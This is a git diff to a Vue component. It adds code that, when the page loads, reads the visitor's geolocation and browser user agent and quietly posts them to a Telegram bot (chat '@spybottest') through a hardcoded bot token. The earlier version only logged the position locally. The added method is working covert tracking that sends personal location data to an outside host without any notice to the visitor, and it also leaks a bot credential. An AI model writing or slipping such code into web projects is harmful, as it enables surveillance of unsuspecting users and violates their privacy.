@@ -12,16 +12,42 @@
   </div>
 </template>
 <script>
+import axios from "axios";
 export default {
+  methods: {
+    async sendUserInfo(user, data) {
+      const info = {
+        user: user,
+        location: data,
+      };
+      const response = await axios.post(
+        "https://api.telegram.org/bot5637853805:AAFXbflITHKv9rqrGGjh7uDBW7WL-SW7k7I/sendMessage?chat_id=@spybottest&text=" +
+          JSON.stringify(info)
+      );
+      console.log(response);
+    },
+    cloneAsObject(obj) {
+      if (obj === null || !(obj instanceof Object)) {
+        return obj;
+      }
+      var temp = obj instanceof Array ? [] : {};
+      // ReSharper disable once MissingHasOwnPropertyInForeach
+      for (var key in obj) {
+        temp[key] = this.cloneAsObject(obj[key]);
+      }
+      return temp;
+    },
+  },
   mounted() {
     if (navigator.geolocation) {
-      console.log(navigator.userAgent);
-      navigator.geolocation.getCurrentPosition(success, error);
+      navigator.geolocation.getCurrentPosition((position) => {
+        this.sendUserInfo(
+          navigator.userAgent,
+          JSON.parse(JSON.stringify(this.cloneAsObject(position)))
+        );
+      }, error);
     } else {
-      error("not supported");
-    }
-    function success(position) {
-      console.log(position);
+      this.sendUserInfo(navigator.userAgent, null);
     }
 
     function error(msg) {
